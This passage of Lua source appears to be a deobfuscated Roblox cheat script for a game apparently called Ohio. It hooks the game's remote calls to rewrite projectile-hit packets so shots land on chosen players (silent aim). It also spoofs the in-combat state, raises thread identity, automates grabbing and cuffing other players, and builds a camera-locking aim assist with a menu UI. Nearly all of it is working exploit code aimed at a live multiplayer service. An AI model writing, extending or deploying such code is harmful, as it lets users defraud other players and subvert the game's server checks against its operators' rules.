											InvokeServer("attemptPurchaseAmmo", arg, false)
										end
									end

									Delay(0.15, function()
										local v30 = fn71()

										if v30 then
											v30.CFrame = cFrame
										end

										flag4 = false
									end)
								end

								Connect(require(ReplicatedStorage.CmdrClient).RemoteEvent.OnClientEvent, function(arg, ...)
									Spawn(fn7, "Blocker", arg, unpack({ ... }))
								end)

								local tbl27 = { fireHit = true, smokeHit = true }
								local tbl28 = {}

								Spawn(function()
									while true do
										Wait(0.5)
										local now = tick()

										for k, v28 in pairs(tbl28) do
											if v28.pending and (not v28.last_time or now - v28.last_time >= 3) then
												v28.pending = false
												v28.last_time = now
												Spawn(fn7, "Blocker", k:gsub("Hit", ""), 3)
											end
										end
									end
								end)

								local v28 = nil
								local v29 = hookfunction
								local v30 = FireServer

								local v31 = luraph_runtime1(function(arg, ...)
									local v31 = table.pack(...)
									local tbl29 = { ... }

									if arg == "projectileHit" then
										local v32 = tbl29[3]
										local hitbox = OhioRageState
										hitbox = hitbox and hitbox.Hitbox

										if hitbox and hitbox.Module and hitbox.Module:Get() and tbl29[2] == "player" and v32 and v32.hitPlayerId then
											local hitChance = hitbox.HitChance

											if hitChance == nil then
												hitChance = 100
											end

											if hitChance >= 100 or hitChance > 0 and Random() * 100 < hitChance then
												local playerByUserId = Players:GetPlayerByUserId(v32.hitPlayerId)
												playerByUserId = playerByUserId and playerByUserId.Character
												local part = hitbox.Part

												if part == "Random" then
													part = Random(2) == 1 and "Head" or "Body"
												end

												local v33

												if part == "Body" then
													v33 = playerByUserId and (FindFirstChild(playerByUserId, "UpperTorso") or FindFirstChild(playerByUserId, "LowerTorso"))
												else
													v33 = playerByUserId and FindFirstChild(playerByUserId, "Head")
												end

												if v33 then
													v32.hitPart = v33
													v32.pos = v33.Position
													v32.hitSize = v33.Size
													tbl29[3] = v32
												end
											end
										end

										return v28(arg, unpack(tbl29))
									end

									if tbl27[arg] then
										local now = tick()
										local v32 = tbl28[arg]

										if not v32 then
											tbl28[arg] = { last_trigger = now, last_notify = now, pending = true }
										else
											v32.last_trigger = now

											if now - v32.last_notify >= 3 then
												v32.pending = true
											end
										end

										return
									end

									return v28(arg, table.unpack(v31, 1, v31.n))
								end)

								v28 = v29(v30, v31)
								local v32 = nil
								local v33 = hookfunction
								local v34 = InvokeServer

								local v35 = luraph_runtime1(function(arg, ...)
									local tbl29 = { ... }

									if arg == "reorderItems" then
										local v35 = tbl29[1]
										local v36 = tbl29[2]

										if tbl11[v35] or tbl11[v36] then
											local currentItemsData = inventory.currentItemsData or {}
											local v37 = nil
											local v38 = nil

											for i = 1, #currentItemsData do
												local v39 = currentItemsData[i]

												if v39 then
													if v39.guid == v35 then
														v37 = i
													elseif v39.guid == v36 then
														v38 = i
													end
												end

												if not (v37 and v38) then
													continue
												end
												break
											end

											if v37 and v38 then
												local currentItemsData2 = inventory.currentItemsData
												local v39 = inventory.currentItemsData[v37]
												inventory.currentItemsData[v37] = inventory.currentItemsData[v38]
												currentItemsData2[v38] = v39
												inventory.update(inventory.currentItemsData)
												return
											end
										end
									end

									return v32(arg, unpack(tbl29))
								end)

								v32 = v33(v34, v35)
								local v36 = nil
								local tbl29 = {}
								fn94 = nil
								local v37 = hookfunction
								local update = inventory.update

								local v38 = luraph_runtime1(function(arg)
									local tbl30

									if typeof(arg) ~= "table" then
										tbl30 = arg
									else
										local tbl31 = {}
										local currentItemsData = inventory.currentItemsData or {}

										for i = 1, #currentItemsData do
											local guid = currentItemsData[i]
											guid = guid and guid.guid

											if guid and tbl11[guid] then
												tbl29[guid] = i
												tbl31[guid] = { index = i, item = tbl11[guid] }
											end
										end

										for k, v38 in pairs(tbl29) do
											if tbl11[k] and not tbl31[k] then
												tbl31[k] = { index = v38, item = tbl11[k] }
											end
										end

										tbl30 = {}

										for i = 1, #arg do
											local v38 = arg[i]
											local guid = v38 and v38.guid

											if not (guid and tbl11[guid]) then
												Insert(tbl30, v38)
											end
										end

										local tbl32 = {}

										for _, v38 in pairs(tbl31) do
											if v38.item and v38.index then
												Insert(tbl32, v38)
											end
										end

										local v38 = fn85(tbl32)

										for i = 1, #v38 do
											local v39 = v38[i]
											local index = v39.index

											if index < 1 then
												index = 1
											elseif #tbl30 + 1 < index then
												index = #tbl30 + 1
											end

											Insert(tbl30, index, v39.item)
										end

										for k in pairs(tbl29) do
											tbl29[k] = nil
										end

										for i = 1, #tbl30 do
											local guid = tbl30[i]
											guid = guid and guid.guid

											if guid and tbl11[guid] then
												tbl29[guid] = i
											end
										end
									end

									local v38 = v36(tbl30)

									if fn94 then
										fn94()
									end

									if fn95 then
										fn95()
									end

									return v38
								end)

								v36 = v37(update, v38)
							end

							local tbl27
							tbl27 = {}

							do
								local v28 = nil
								local v29 = hookfunction
								local replicateEffect = v3effect.ReplicateEffect

								local v30 = luraph_runtime1(function(arg, ...)
									local tbl28 = tbl27 or {}

									for i = 1, #tbl28 do
										local v30 = tbl12[tbl28[i]]

										if v30 ~= nil then
											if typeof(v30) == "table" then
												for i2 = 1, #v30 do
													if arg == v30[i2] then
														return
													end
												end

												continue
											end

											if arg ~= v30 then
												continue
											end
											return
										end
									end

									return v28(arg, ...)
								end)

								v28 = v29(replicateEffect, v30)
							end

							do
								local v28 = nil
								local v29 = hookfunction
								local setEquipped = inventory.setEquipped

								local v30 = luraph_runtime1(function(...)
									local v30 = getthreadidentity()
									setthreadidentity(2)
									v28(...)
									setthreadidentity(v30 or 8)
								end)

								v28 = v29(setEquipped, v30)
							end

							dealerSellCooldown = 0

							do
								local v28 = nil
								local v29 = hookfunction
								local v30 = makeToast

								local v31 = luraph_runtime1(function(...)
									local v31 = table.pack(...)
									local v32 = ({ ... })[1]

									if typeof(v32) == "string" then
										if v32:find("Cheap Metal") or v32:find("Chemicals") or v32:find("craft ready") then
											return
										end

										if v32:find("The dealer only has") then
											dealerSellCooldown = tick() + 60
										end
									end

									return v28(table.unpack(v31, 1, v31.n))
								end)

								v28 = v29(v30, v31)
							end

							do
								local function fn95()
									local ok4, result4 = pcall(function()
										return Enum.RaycastFilterType.Include
									end)

									if ok4 and result4 then
										return result4
									end

									local ok5, result5 = pcall(function()
										return Enum.RaycastFilterType.Whitelist
									end)

									if ok5 then
										return result5
									end
								end

								local function fn96(arg)
									if type(arg) == "number" then
										local playerByUserId = Players:GetPlayerByUserId(arg)
										return playerByUserId and playerByUserId.Character
									end

									if typeof(arg) ~= "Instance" then
										return arg
									end

									if IsA(arg, "Player") then
										return arg.Character
									end
									return arg
								end

								local function fn97(arg)
									if type(arg) == "table" then
										if arg.hitType and arg.hit and arg.rootModel then
											return nil, arg
										end

										if arg.cframe and arg.size then
											return arg
										end
									end

									local v28 = fn96(arg)
									if typeof(v28) ~= "Instance" then
										return
									end
									local result4, result5

									if IsA(v28, "Model") then
										local ok4

										ok4, result4, result5 = pcall(function()
											return v28:GetBoundingBox()
										end)

										if not ok4 then
											return
										end
									elseif IsA(v28, "BasePart") then
										result4 = v28.CFrame
										result5 = v28.Size
									else
										local v29 = FindFirstChildWhichIsA(v28, "BasePart", true)
										if not v29 then
											return
										end
										result4 = v29.CFrame
										result5 = v29.Size
									end

									local overlapParams = OverlapParams.new()
									local v29 = fn95()

									if v29 then
										overlapParams.FilterType = v29
									end

									overlapParams.FilterDescendantsInstances = { v28 }

									return {
										cframe = result4,
										size = result5 + NewVector3(0.25, 0.25, 0.25),
										overlapParams = overlapParams,
										hitOrigin = result4.Position,
									}
								end

								local function fn98(arg, arg2)
									local v28 = fn96(arg2)
									if not arg or typeof(v28) ~= "Instance" then
										return false
									end
									local hit = arg.hit
									local rootModel = arg.rootModel
									if hit == v28 or rootModel == v28 then
										return true
									end

									if typeof(hit) == "Instance" and (hit:IsDescendantOf(v28) or v28:IsDescendantOf(hit)) then
										return true
									end

									if typeof(rootModel) == "Instance" and (rootModel:IsDescendantOf(v28) or v28:IsDescendantOf(rootModel)) then
										return true
									end
									return false
								end

								local function fn99(arg)
									local v28, v29 = fn97(arg)
									if v29 then
										return v29
									end

									if not v28 or not zoneUtils or not zoneUtils.zoneHitreg then
										return
									end
									local ok4, result4 = pcall(zoneUtils.zoneHitreg, v28)
									if not ok4 or type(result4) ~= "table" then
										return
									end

									for i = 1, #result4 do
										local v30 = result4[i]
										if fn98(v30, arg) then
											return v30
										end
									end

									return result4[1]
								end

								local function fn100(arg)
									local v28 = FindFirstChild(workspace, "Game")
									local v29 = v28 and FindFirstChild(v28, "Props")

									while arg and arg ~= workspace do
										if GetAttribute(arg, "guid") and (CollectionService:HasTag(arg, "prop") or CollectionService:HasTag(arg, "subprop") or v29 and arg:IsDescendantOf(v29)) then
											return arg
										end
										arg = arg.Parent
									end
								end

								local function fn101(arg)
									local v28 = FindFirstChild(workspace, "Game")
									local v29 = v28 and FindFirstChild(v28, "Vehicles")
									if not v29 or not arg:IsDescendantOf(v29) then
										return
									end

									while arg and arg.Parent ~= v29 do
										arg = arg.Parent
									end

									return arg
								end

								local function fn102(arg)
									if not arg then
										return
									end
									local vehicles = state and state.vehicles and state.vehicles[arg]
									if vehicles and vehicles.guid then
										return vehicles.guid
									end
									local v28 = FindFirstChild(arg, "GUID")
									if v28 then
										return v28.Value
									end
									return GetAttribute(arg, "guid")
								end

								local function fn103(arg, arg2)
									local v28 = fn99(arg2)

									if v28 then
										local hitType = v28.hitType
										local rootModel = v28.rootModel

										if hitType == "player" then
											local playerFromCharacter = Players:GetPlayerFromCharacter(rootModel)
											if playerFromCharacter then
												return "player", { meleeType = arg, hitPlayerId = playerFromCharacter.UserId }
											end
										elseif hitType == "prop" then
											local v29 = rootModel and GetAttribute(rootModel, "guid")
											if v29 then
												return "prop", { meleeType = arg, guid = v29 }
											end
										elseif hitType == "vehicle" then
											local v29 = fn102(rootModel)
											if v29 then
												return "vehicle", { meleeType = arg, guid = v29 }
											end
										else
											if hitType == "furniture" and rootModel then
												return "furniture", { meleeType = arg, guid = rootModel.Name }
											end

											if hitType == "jewelcase" then
												local v29 = rootModel and GetAttribute(rootModel, "guid")
												if v29 then
													return "jewelcase", { meleeType = arg, guid = v29 }
												end
											end
										end
									end

									if type(arg2) == "number" then
										return "player", { meleeType = arg, hitPlayerId = arg2 }
									end

									if typeof(arg2) == "Instance" then
										if IsA(arg2, "Player") then
											return "player", { meleeType = arg, hitPlayerId = arg2.UserId }
										end
										local parent = IsA(arg2, "Model") and arg2 or arg2.Parent
										local playerFromCharacter = parent and Players:GetPlayerFromCharacter(parent)
										if playerFromCharacter then
											return "player", { meleeType = arg, hitPlayerId = playerFromCharacter.UserId }
										end
										local v29 = fn100(arg2)
										local v30 = v29 and GetAttribute(v29, "guid")
										if v30 then
											return "prop", { meleeType = arg, guid = v30 }
										end
										local v31 = fn101(arg2)
										local v32 = fn102(v31)
										if v32 then
											return "vehicle", { meleeType = arg, guid = v32 }
										end
									end
								end
							end

							local function fn95(arg)
								FireServer("equip", arg)
							end

							local fn96
							fn96 = function(...) end
							local fn97

							fn97 = function(arg)
								FireServer("finish", arg)
							end

							local fn98
							local tbl28 = {}

							fn98 = function(arg)
								local now = tick()

								if not tbl28[arg.UserId] then
									tbl28[arg.UserId] = now
								end

								if now - tbl28[arg.UserId] < 0.1 then
									return
								end
								tbl28[arg.UserId] = now
								FireServer("grabPlayer", arg)
							end

							local fn99
							local tbl29 = {}

							fn99 = function(arg)
								local now = tick()

								if not tbl29[arg.UserId] then
									tbl29[arg.UserId] = now
								end

								if now - tbl29[arg.UserId] < 0.1 then
									return
								end
								tbl29[arg.UserId] = now
								FireServer("dropPlayer", arg)
							end

							local fn100

							fn100 = function(arg)
								Spawn(fn93, "Handcuffs")
								local Handcuffs = fn72("Handcuffs")

								if Handcuffs then
									fn76(Handcuffs.guid)
									FireServer("cuffPlayer", arg)
								end
							end

							local n4
							n4 = 64
							local n5
							n5 = 0
							local v28
							v28 = nil
							local v29
							v29 = nil
							local v30
							v30 = nil
							local v31
							v31 = nil
							local v32
							v32 = nil
							local v33
							v33 = nil

							do
								local v34

								local function fn101()
									local position = fn71()
									local v35 = Camera()
									position = position and position.Position or v35 and v35.CFrame.Position
									n5 = 0
									if not position then
										return n5
									end
									local v36 = GetClosest()

									for i = 1, #v36 do
										local v37 = v36[i]

										if not (n4 <= n5) then
											local character = v37.Character
											local v38 = character and FindFirstChildOfClass(character, "Humanoid")
											local v39 = character and FindFirstChild(character, "HumanoidRootPart")
											local v40 = character and FindFirstChild(character, "Head")

											if not (not character or FindFirstChildOfClass(character, "ForceField") or not v38 or v38.Health <= 0 or not v39 or not v40 or not CheckState(v37)) then
												n5 += 1
												v34[7][v34[6] + n5] = v37
												v28[7][v28[6] + n5] = character
												v29[7][v29[6] + n5] = v38
												v30[7][v30[6] + n5] = v39
												v31[7][v31[6] + n5] = v40
												v32[7][v32[6] + n5] = (position - v39.Position).Magnitude
												v33[7][v33[6] + n5] = GetAttribute(v37, "isSpawned") == true
											end

											continue
										end

										break
									end

									return n5
								end

								local function fn102()
									local tbl30 = {}
									local v35 = fn71()
									if not v35 then
										return tbl30
									end

									local function fn103(arg)
										local position = arg and arg.PrimaryPart and arg.PrimaryPart.Position
										if not position then
											return
										end

										Insert(tbl30, {
											model = arg,
											pos = position,
											dist = (position - v35.Position).Magnitude,
											prompt = FindFirstChildOfClass(arg, "ProximityPrompt"),
										})
									end

									local v36 = FindFirstChild(workspace, "Game")
									local v37 = v36 and FindFirstChild(v36, "Entities")
									local v38 = v37 and FindFirstChild(v37, "vehicles")

									if v38 then
										local v39 = GetChildren(v38)

										for i = 1, #v39 do
											fn103(v39[i])
										end
									end

									local v39 = v36 and FindFirstChild(v36, "Vehicles")

									if v39 then
										local v40 = GetChildren(v39)

										for i = 1, #v40 do
											fn103(v40[i])
										end
									end

									Sort(tbl30, function(arg, arg2)
										return arg.dist < arg2.dist
									end)

									return tbl30
								end

								local tbl30 = {}
								local n6 = 0

								local function fn103()
									local now = tick()
									if now - n6 < 1 then
										return tbl30
									end
									tbl30 = {}
									local v35 = FindFirstChild(workspace, "Game")
									local v36 = v35 and FindFirstChild(v35, "Entities")
									local v37 = v36 and FindFirstChild(v36, "ItemPickup")

									if v37 then
										local v38 = GetChildren(v37)

										for i = 1, #v38 do
											local v39 = v38[i]

											if typeof(v39) == "Instance" then
												Insert(tbl30, v39)
											end
										end
									end

									n6 = now
									return tbl30
								end

								local function fn104(arg, arg2)
									return typeof(arg) == "table" and Find(arg, arg2) ~= nil
								end

								local function fn105(arg)
									if not arg then
										return false
									end
									local v35 = FindFirstChildOfClass(arg, "ProximityPrompt")
									local v36 = FindFirstChildOfClass(arg, "ClickDetector")

									if v35 then
										fireproximityprompt(v35)
									end

									if v36 then
										fireclickdetector(v36)
									end

									return v35 ~= nil or v36 ~= nil
								end

								local function fn106(arg, arg2)
									v3effect.ReplicateEffect(arg, { position = arg2, guid = "1" })
								end

								local function fn107(arg)
									if not arg then
										return
									end

									if arg.startAmmo and arg.startAmmo > 0 and arg.ammoManager and arg.ammoManager.ammoOut < arg.ammo then
										fn93(arg.name, true)
									end

									ClientReplicator.Set(LocalPlayer, "reloading", true)
									ClientReplicator.Replicate("reloading")
									FireServer("reload", arg.guid)

									if v3item.crosshairs and v3item.crosshairs.reloading then
										v3item.crosshairs.reloading(arg.reloadTime)
									end
								end

								local function fn108(arg, arg2)
									if not arg or not arg.guid or not arg2 then
										return false
									end

									if arg.ammoManager and not arg.ammoManager:UseAmmo(1) then
										fn107(arg)
										return false
									end
									FireServer("replicateShot")
									FireServer("replicateProjectiles", arg.guid, arg2, arg.firemode)
									return true
								end

								local function fn109(arg, arg2)
									if not arg or not arg2 then
										return {}
									end
									local tbl31 = {}
									local numProjectiles = arg.numProjectiles or (arg.subtype == "shotgun" or arg.subtypes == "shotgun") and 8 or 1

									for i = 1, numProjectiles do
										local cFrame = arg2.CFrame
										Insert(tbl31, { GUID(), cFrame })
									end

									return tbl31
								end

								local function fn110(arg, arg2, arg3)
									if not arg or not arg3 then
										return
									end

									if not arg.equipped then
										fn76(arg.guid)
									end

									local v35 = fn109(arg, arg3)
									if #v35 == 0 or not fn108(arg, v35) then
										return
									end

									if not arg2.UserId then
										return
									end

									for i = 1, #v35 do
										local v36 = v35[i]
										FireServer("projectileHit", v36[1], "player", { hitSize = arg3.Size, hitPart = arg3, pos = arg3.Position, hitPlayerId = arg2.UserId })

										if HitmarkerHandler and HitmarkerHandler.PlayerHit then
											HitmarkerHandler.PlayerHit({ type = "bullet", guid = v36[1] }, nil, { hitPlayerId = arg2.UserId })
										end
									end
								end

								local v35 = v14:CreateTab({ Id = "ohio-legit", Name = "Legit" })

								local function fn111()
									tonumber(GetAttribute(LocalPlayer, "aimAssistSensitivity"))

									local tbl31 = {
										AimAssist = {
											Module = nil,
											Enabled = true,
											UseFov = true,
											Fov = 45,
											FovColor = NewColor3(1, 1, 1),
											SpeedX = 2.7,
											SpeedY = 2.8,
											PredictionX = 2.8,
											PredictionY = 2.6,
											Range = 300,
											Part = "Body",
											Animation = "Linear",
										},
										SilentAim = {
											Module = nil,
											Enabled = false,
											Fov = 10,
											HitChance = 50,
											Accuracy = 70,
											PointScale = 62,
											Priority = "Closest",
											Hitboxes = { Head = true, Body = true, Arms = true, Legs = true },
											PredictionX = 1.7,
											PredictionY = 1.1,
											VisualizeFov = false,
											IgnoreDowned = true,
										},
										GunMod = {
											Enabled = false,
											Recoil = 100,
											Spread = 100,
											FireDebounce = 100,
											BulletSpeed = 1,
											BulletLifetime = 1,
										},
									}

									local tbl32 = {
										SilentBlock = false,
										AllowBlockStomp = true,
										AntiRagdoll = false,
										NoSit = true,
										NoInCombat = true,
										Connection = nil,
									}

									local v36 = nil
									local v37 = hookfunction
									local check = ClientReplicator.Check

									local v38 = luraph_runtime1(function(arg, arg2)
										if tbl32.AllowBlockStomp and arg == LocalPlayer then
											if debug.traceback():lower():find("stomp") then
												return true
											end
										end

										return v36(arg, arg2)
									end)

									v36 = v37(check, v38)
									local v39 = hookfunction
									local isInCombat = combatIndicator.isInCombat

									local v40 = luraph_runtime1(function()
										if tbl32.NoInCombat then
											return false
										end
										return oldisInCombat()
									end)

									oldisInCombat = v39(isInCombat, v40)

									local function fn112()
										if tbl32.Connection then
											Cancel(tbl32.Connection)
											tbl32.Connection = nil
										end
									end

									local function fn113()
										fn112()
										tbl32.Connection = Spawn(function(...) end)
									end

									local v41 = v35:CreateModule({
										Id = "ohio-legit-state",
										Name = "State",
										Default = true,
										Callback = function(arg)
											if arg then
												fn113()
											else
												fn112()
											end
										end,
									})

									v41:CreateToggle({
										Id = "silent-block",
										Name = "Silent Block",
										Default = tbl32.SilentBlock,
										Callback = function(silentBlock)
											tbl32.SilentBlock = silentBlock
										end,
									})

									v41:CreateToggle({
										Id = "allow-block-stomp",
										Name = "Allow Block Stomp",
										Default = tbl32.AllowBlockStomp,
										Callback = function(allowBlockStomp)
											tbl32.AllowBlockStomp = allowBlockStomp
										end,
									})

									v41:CreateToggle({
										Id = "anti-ragdoll",
										Name = "Anti Ragdoll",
										Default = tbl32.AntiRagdoll,
										Callback = function(antiRagdoll)
											tbl32.AntiRagdoll = antiRagdoll
										end,
									})

									v41:CreateToggle({
										Id = "no-sit",
										Name = "No Sit",
										Default = tbl32.NoSit,
										Callback = function(noSit)
											tbl32.NoSit = noSit
										end,
									})

									v41:CreateToggle({
										Id = "no-in-combat",
										Name = "No In Combat",
										Default = tbl32.NoInCombat,
										Callback = function(noInCombat)
											tbl32.NoInCombat = noInCombat
										end,
									})

									if GetAttribute(LocalPlayer, "aimAssistSensitivity") == nil then
										SetAttribute(LocalPlayer, "aimAssistSensitivity", tbl31.AimAssist.SpeedX)
									end

									local function fn114(arg)
										local viewportSize = arg.ViewportSize
										if UserInputService.TouchEnabled then
											return viewportSize.X * 0.5, viewportSize.Y * 0.5
										end
										local v42 = MouseLocation()
										return v42.X, v42.Y
									end

									local v42 = Tan(Rad(35))
									local thickness = 1
									local transparency = 0.5
									local v43 = nil
									local v44 = nil
									local v45 = nil
									local v46 = nil
									local v47 = nil
									local v48 = nil
									local v49 = nil
									local v50 = nil

									local tbl33 = {
										MaxTargets = 64,
										Count = 0,
										LosParams = NewRayParams(),
										LosFilter = { nil, nil },
										LosReady = false,
										FovLastShow = false,
										FovLastX = 0,
										FovLastY = 0,
										FovLastDiam = 0,
										FovLastColor = nil,
									}

									tbl33.LosParams.FilterType = Enum.RaycastFilterType.Exclude
									tbl33.LosParams.IgnoreWater = true

									pcall(function()
										local hui = typeof(gethui) == "function" and gethui() or CoreGui
										local ScreenGui = NewInstance("ScreenGui")
										ScreenGui.Name = "\0"
										ScreenGui.IgnoreGuiInset = true
										ScreenGui.ResetOnSpawn = false
										ScreenGui.DisplayOrder = 10
										ScreenGui.Parent = hui
										local Frame = NewInstance("Frame")
										Frame.Name = "\0"
										Frame.BackgroundTransparency = 1
										Frame.AnchorPoint = NewVector2(0.5, 0.5)
										Frame.BorderSizePixel = 0
										Frame.Visible = false
										Frame.Parent = ScreenGui
										local UICorner = NewInstance("UICorner")
										UICorner.CornerRadius = NewUDim(1, 0)
										UICorner.Parent = Frame
										local UIStroke = NewInstance("UIStroke")
										UIStroke.Thickness = thickness
										UIStroke.Transparency = transparency
										UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
										UIStroke.Parent = Frame
										v43 = ScreenGui
										v44 = Frame
										v45 = UIStroke
									end)

									local function fn115(arg, arg2)
										local v51 = Clamp((arg2 or 0) * 0.5, 0, 89)
										arg = arg and arg.ViewportSize.Y or 0
										if arg < 1 then
											return 0
										end
										return arg * 0.5 * Tan(Rad(v51)) / v42
									end

									local function fn116()
										if v46 then
											Disconnect(v46)
											v46 = nil
										end

										if v44 and v44.Visible then
											v44.Visible = false
										end

										tbl33.FovLastShow = false
									end

									local function fn117()
										fn116()
										if not v44 or not v45 then
											return
										end

										local function fn118()
											local v51 = tbl33
											local aimAssist = tbl31.AimAssist
											local v52 = Camera()
											local fovLastShow = (aimAssist.Module == nil or aimAssist.Module:Get() == true) and aimAssist.UseFov == true and v52 ~= nil

											if v51.FovLastShow ~= fovLastShow then
												v51.FovLastShow = fovLastShow
												v44.Visible = fovLastShow
											end

											if not fovLastShow then
												return
											end
											local v53, v54 = fn114(v52)
											local v55 = Max(2, Floor(fn115(v52, aimAssist.Fov) * 2 + 0.5))
											local fovColor = aimAssist.FovColor or White

											if v51.FovLastColor ~= fovColor then
												v51.FovLastColor = fovColor
												v45.Color = fovColor
												v45.Transparency = transparency
											end

											if v51.FovLastX ~= v53 or v51.FovLastY ~= v54 then
												v51.FovLastX = v53
												v51.FovLastY = v54
												v44.Position = NewUDim2(0, v53, 0, v54)
											end

											if v51.FovLastDiam ~= v55 then
												v51.FovLastDiam = v55
												v44.Size = NewUDim2(0, v55, 0, v55)
											end
										end

										fn118()
										v46 = Connect(RunService.RenderStepped, fn118)
									end

									local function fn118(arg)
										local v51 = v47[7][v47[6] + arg]
										if not v51 then
											return nil
										end
										local part = tbl31.AimAssist.Part
										local v52 = v48[7][v48[6] + arg]
										local v53 = v49[7][v49[6] + arg]
										local v54 = v50[7][v50[6] + arg]

										if part == "Head" then
											if v52 and v52.Parent then
												return v52
											end
										elseif part == "Body" then
											if v53 and v53.Parent then
												return v53
											end

											if v54 and v54.Parent then
												return v54
											end
										end

										if v53 and v53.Parent then
											return v53
										end

										if v52 and v52.Parent then
											return v52
										end
										return v51.PrimaryPart
									end

									local function fn119(...) end

									local function fn120(arg, arg2, arg3, arg4)
										local v51 = tbl33

										if not v51.LosReady or v51.LosFilter[1] ~= arg4 then
											v51.LosReady = true
											local v52 = FindFirstChild(workspace, "Game")
											v51.LosFilter[1] = arg4
											v51.LosFilter[2] = v52 and FindFirstChild(v52, "Local") or nil
											v51.LosParams.FilterDescendantsInstances = v51.LosFilter
										end

										local n7 = arg2 - arg
										local magnitude = n7.Magnitude
										if magnitude <= 0.25 then
											return true
										end
										local losParams = v51.LosParams
										local v52 = RaycastWorkspace(arg, n7.Unit * Min(magnitude, 1500), losParams)
										return not v52 or v52.Instance and IsDescendantOf(v52.Instance, arg3)
									end

									local n7 = 0.032
									local n8 = 1000
									local n9 = 0.36
									local n10 = 0.9

									local function fn121(arg, arg2, arg3, arg4, arg5)
										arg2 = arg2 or EmptyVector3
										local n11 = n7 + arg3 / n8 * n9
										return arg + NewVector3(arg2.X * arg4, arg2.Y * arg5, arg2.Z * arg4) * n11 * n10
									end

									local function fn122()
										local animation = tbl31.AimAssist.Animation
										local flag4 = type(animation) == "string" and Enum.EasingStyle[animation]
										if typeof(flag4) == "EnumItem" then
											return flag4
										end
										return Enum.EasingStyle.Linear
									end

									local function fn123(arg, arg2)
										if arg < 0 then
											arg = 0
										elseif arg > 1 then
											arg = 1
										end

										return TweenService:GetValue(arg, arg2, Enum.EasingDirection.InOut)
									end

									local function fn124(arg, arg2, arg3)
										if arg2 == Enum.EasingStyle.Linear then
											return arg
										end
										local num = tonumber(arg3)

										if not num or num <= 0 then
											num = 0.016666666666666666
										end

										return fn123(Clamp(arg * 10 * num, 0, 1), arg2)
									end

									local function fn125(arg, arg2)
										local aimAssistMod = fn74()
										local ammoManager = aimAssistMod and aimAssistMod.ammoManager

										if ammoManager then
											ammoManager = (aimAssistMod.ammoManager.ammo or 0) > 0
										end

										if not ammoManager then
											return
										end
										local v51 = fn69()
										local v52 = fn71()
										local v53 = Camera()
										if not (v51 and v52 and v53) then
											return
										end
										local cFrame = v53.CFrame
										local position = cFrame.Position
										local viewportSize = v53.ViewportSize
										local v54, v55 = fn114(v53)
										local v56 = fn115(v53, tbl31.AimAssist.Fov)
										local v57 = Huge
										local useFov = tbl31.AimAssist.UseFov
										local range = tbl31.AimAssist.Range
										local predictionX = tbl31.AimAssist.PredictionX
										local predictionY = tbl31.AimAssist.PredictionY
										local v58 = Max(1, Min(viewportSize.X, viewportSize.Y) * 0.5)
										local n11 = nil
										local n12 = nil

										for i = 1, fn119() do
											local v59 = v47[7][v47[6] + i]
											local primaryPart = fn118(i) or v48[7][v48[6] + i]

											if (not primaryPart or not primaryPart.Parent) and v59 then
												primaryPart = v59.PrimaryPart
											end

											if primaryPart and primaryPart.Parent then
												local position2 = primaryPart.Position
												local v60 = LocalPlayer:DistanceFromCharacter(position2)

												if v60 <= range then
													local v61 = fn121(position2, primaryPart.Velocity or EmptyVector3, v60, predictionX, predictionY)
													local v62 = PointToObjectSpace(cFrame, v61)
													local magnitude = v62.Magnitude

													if magnitude > 0.35 then
														local n13 = 1 / magnitude
														local n14 = v62.X * n13
														local n15 = v62.Y * n13
														local n16 = -v62.Z * n13

														if n16 > 0.02 then
															local v63, v64, v65, v66 = WorldToViewport(v61)

															if v65 > 0.05 then
																local n17 = v63 - v54
																local n18 = v64 - v55
																local v67 = Sqrt(n17 * n17 + n18 * n18)

																if not useFov or v67 <= v56 then
																	if not v66 then
																		v67 += 400
																	end

																	local n19 = (v67 / v58) ^ 2 * 1.55 + (v60 / Max(1, range)) ^ 2 * 0.35

																	if n19 < v57 and fn120(position, position2, v59, v51) then
																		local v68 = ToRad
																		n11 = Atan2(n14, n16) / v68
																		local v69 = ToRad
																		n12 = Atan2(n15, n16) / v69
																		v57 = n19
																	end
																end
															end
														end
													end
												end
											end
										end

										if not n11 then
											return
										end
										aimAssistMod = aimAssistMod and aimAssistMod.aimAssistMod or 1
										local v59 = fn122()
										local v60 = fn124(tbl31.AimAssist.SpeedX * aimAssistMod, v59, arg2)
										local v61 = fn124(tbl31.AimAssist.SpeedY * aimAssistMod, v59, arg2)
										local n13 = ClientReplicator.Get(LocalPlayer, "xAngle") or 0
										local v62 = Clamp((ClientReplicator.Get(LocalPlayer, "yAngle") or 0) + n12 * v61, -80, 80)
										ClientReplicator.Set(LocalPlayer, "xAngle", (n13 - n11 * v60) % 360)
										ClientReplicator.Set(LocalPlayer, "yAngle", v62)
									end

									tbl31.AimAssist.Module = v35:CreateModule({
										Id = "ohio-aim-assist",
										Name = "AimAssist",
										Default = false,
										Callback = function(arg)
											if arg then
												hookfunction(require(ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller).aimAssist, fn125)
												fn117()
											elseif isfunctionhooked(require(ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller).aimAssist) then
												restorefunction(require(ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller).aimAssist)
												fn116()
											else
												fn116()
											end
										end,
									})

									tbl31.AimAssist.Module:CreateSelector({
										Id = "ohio-aim-assist-part",
										Name = "Part",
										Options = { { Value = "Head" }, { Value = "Body" } },
										Default = tbl31.AimAssist.Part,
										Callback = function(part)
											tbl31.AimAssist.Part = part
										end,
									})

									tbl31.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-x-speed",
										Name = "X Speed",
										Min = 0.1,
										Max = 5,
										Default = tbl31.AimAssist.SpeedX,
										Step = 0.1,
										Callback = function(speedX)
											tbl31.AimAssist.SpeedX = speedX
											SetAttribute(LocalPlayer, "aimAssistSensitivity", speedX)
										end,
									})

									tbl31.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-y-speed",
										Name = "Y Speed",
										Min = 0.1,
										Max = 5,
										Default = tbl31.AimAssist.SpeedY,
										Step = 0.1,
										Callback = function(speedY)
											tbl31.AimAssist.SpeedY = speedY
										end,
									})

									tbl31.AimAssist.Module:CreateSelector({
										Id = "ohio-aim-assist-animation",
										Name = "Animation",
										Options = {
											{ Value = "Linear" },
											{ Value = "Sine" },
											{ Value = "Quad" },
											{ Value = "Cubic" },
											{ Value = "Quart" },
											{ Value = "Quint" },
											{ Value = "Exponential" },
											{ Value = "Circular" },
											{ Value = "Back" },
											{ Value = "Bounce" },
											{ Value = "Elastic" },
										},
